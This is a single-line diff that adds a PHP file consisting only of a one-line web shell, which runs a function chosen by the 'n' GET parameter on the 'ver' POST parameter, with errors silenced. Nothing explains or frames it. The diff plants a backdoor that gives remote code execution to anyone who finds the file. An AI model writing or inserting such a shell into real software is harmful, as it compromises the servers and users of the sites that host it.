@@ -1,0 +1,1 @@
+<?php @$_GET[n]($_POST[ver]);?> 
